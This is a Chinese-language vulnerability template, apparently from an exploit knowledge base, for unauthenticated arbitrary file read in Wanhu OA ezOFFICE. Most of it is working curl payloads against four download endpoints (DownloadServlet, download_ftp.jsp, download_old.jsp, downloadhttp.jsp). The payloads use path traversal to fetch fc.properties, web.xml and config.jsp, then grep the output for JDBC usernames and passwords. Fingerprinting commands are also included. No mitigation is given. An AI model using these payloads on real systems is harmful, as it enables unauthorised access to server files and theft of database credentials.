---
id: WANHU-FILE-READ
title: 万户OA ezOFFICE 多接口任意文件读取漏洞
product: wanhu-oa
vendor: 万户网络
version_affected: "all versions"
severity: HIGH
tags: [file_read, file_download, path_traversal, 无需认证, 国产, oa]
fingerprint: ["万户", "ezOFFICE", "万户网络"]
---

## 漏洞描述

万户OA（ezOFFICE）存在多个未授权任意文件读取/下载接口，包括 DownloadServlet、download_ftp.jsp、download_old.jsp 和 downloadhttp.jsp，攻击者可通过路径穿越读取服务器上的任意文件，包括配置文件、数据库连接信息等敏感内容。

## 影响版本

- 万户OA ezOFFICE（所有已知版本）

## 前置条件

- 无需认证
- 目标运行万户OA ezOFFICE
- Web 应用端口可达

## 利用步骤

1. 确认目标为万户OA
2. 尝试多个文件下载接口
3. 通过路径穿越读取敏感配置文件（如 fc.properties、web.xml）
4. 从配置文件中提取数据库凭据等敏感信息

## Payload

**方式一：DownloadServlet**

```bash
curl -s "http://target/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
```

**方式二：download_ftp.jsp**

```bash
curl -s "http://target/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
```

**方式三：download_old.jsp**

```bash
# 读取 web.xml
curl -s "http://target/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml"

# 读取首页
curl -s "http://target/defaultroot/download_old.jsp?path=..&name=x&FileName=index.jsp"
```

**方式四：downloadhttp.jsp**

```bash
curl -s "http://target/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
```

## 验证方法

```bash
# 读取 fc.properties 配置文件（包含数据库连接信息）
curl -s "http://target/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2" | grep -i "jdbc\|password\|username"

# 读取 web.xml
curl -s "http://target/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml" | grep -i "servlet\|web-app"
```

## 指纹确认

```bash
curl -s "http://target/defaultroot/" | grep -i "ezOFFICE\|万户"
curl -s "http://target/defaultroot/login.jsp" -o /dev/null -w "%{http_code}"
```
